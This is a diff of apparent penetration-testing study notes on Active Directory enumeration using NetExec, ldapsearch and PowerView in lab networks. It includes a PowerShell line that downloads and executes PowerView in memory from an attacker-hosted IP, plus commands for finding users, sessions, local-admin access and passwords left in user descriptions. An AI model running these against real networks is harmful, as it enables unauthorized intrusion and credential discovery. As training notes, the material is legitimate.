@@ -2,37 +2,94 @@
 
 <details>
 
-<summary>Finding Name of Domain</summary>
+<summary>Enumerate Domain Hosts</summary>
 
-```bash
-crackmapexec smb 10.11.1.123 -u '' -p ''
+```powershell
+# To generate /etc/hosts entries
+nxc smb 172.16.155.0/24 --generate-hosts-file hosts.txt
+
+# Double-check to ensure all hosts are included (eg: SMB not enabled)
+nxc winrm 172.16.155.0/24
 ```
 
-```bash
-ldapsearch -x -H ldap://10.10.10.175 -s base
-```
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
-* `rootDomainNamingContext: DC=EGOTISTICAL-BANK,DC=LOCAL`
-  * Domain: `EGOTISTICAL-BANK.LOCAL`
+```powershell
+# Using PowerView to double-check
+iex (new-object net.webclient).downloadstring('http://192.168.45.218/PowerView.ps1')
+Get-NetComputer | select operatingsystem, dnshostname
+nslookup <hostname>
+```
 
 </details>
 
 <details>
 
-<summary>LDAPSearch</summary>
+<summary>PowerView</summary>
 
-```bash
-ldapsearch -H ldap://192.168.165.122 -x -W -b "dc=hutch,dc=offsec" > ldap_search.txt
+Download PowerView from [here](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1)
 
-# Usernames
-cat ldap_search.txt| grep -i "samaccountname"
+```powershell
+Import-Module .\PowerView.ps1
+```
 
-# Might have hidden passwords
-cat ldap_search.txt| grep -i "description"
+### Enumerate Hostnames & IPs of Computers
+
+```powershell
+Get-DomainComputer -Domain ops.comply.com  | select name, dnshostname, operatingsystem
 ```
 
 ```bash
-ldapsearch -x -H ldap://10.10.10.175 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL'
+nslookup jump09.ops.comply.com
+
+#Name:    jum09.ops.comply.com
+#Address:  172.16.218.167
+```
+
+### Enumerate Users
+
+```powershell
+Get-NetUser | select samaccountname, lastlogon
+```
+
+### Enumerate Groups
+
+* Able to show nested groups (unlike `net groups`)
+
+```powershell
+Get-NetGroup | select samaccountname
+```
+
+### Enumerate OS of Domain hosts
+
+```powershell
+Get-NetComputer | select operatingsystem, dnshostname
+```
+
+### Resolves Domain Name to IP address
+
+```powershell
+Resolve-IPAddress CLIENT76.corp.com
+```
+
+### Tests if current account has localadmin access to domain hosts
+
+```powershell
+Find-LocalAdminAccess
+```
+
+### View if someone logs into the box
+
+* Might not work if running newer versions of Windows
+
+```powershell
+Get-NetSession -ComputerName files04 -verbose
+```
+
+#### OR, Use PsLoggedon
+
+```powershell
+.\PsLoggedon.exe \\client74
 ```
 
 </details>
@@ -123,77 +180,6 @@ Serving HTTP on localhost port 80 (http://localhost:80/) ...
 Start `neo4j console` and start `bloodhound`
 
 Upload the zip file to ![](<../.gitbook/assets/image (13).png>)
-
-</details>
-
-<details>
-
-<summary>PowerView</summary>
-
-Download PowerView from [here](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1)
-
-```powershell
-Import-Module .\PowerView.ps1
-```
-
-### Enumerate Hostnames & IPs of Computers
-
-```powershell
-Get-DomainComputer -Domain ops.comply.com  | select name, dnshostname, operatingsystem
-```
-
-```bash
-nslookup jump09.ops.comply.com
-
-#Name:    jum09.ops.comply.com
-#Address:  172.16.218.167
-```
-
-### Enumerate Users
-
-```powershell
-Get-NetUser | select samaccountname, lastlogon
-```
-
-### Enumerate Groups
-
-* Able to show nested groups (unlike `net groups`)
-
-```powershell
-Get-NetGroup | select samaccountname
-```
-
-### Enumerate OS of Domain hosts
-
-```powershell
-Get-NetComputer | select operatingsystem, dnshostname
-```
-
-### Resolves Domain Name to IP address
-
-```powershell
-Resolve-IPAddress CLIENT76.corp.com
-```
-
-### Tests if current account has localadmin access to domain hosts
-
-```powershell
-Find-LocalAdminAccess
-```
-
-### View if someone logs into the box
-
-* Might not work if running newer versions of Windows
-
-```powershell
-Get-NetSession -ComputerName files04 -verbose
-```
-
-#### OR, Use PsLoggedon
-
-```powershell
-.\PsLoggedon.exe \\client74
-```
 
 </details>
 
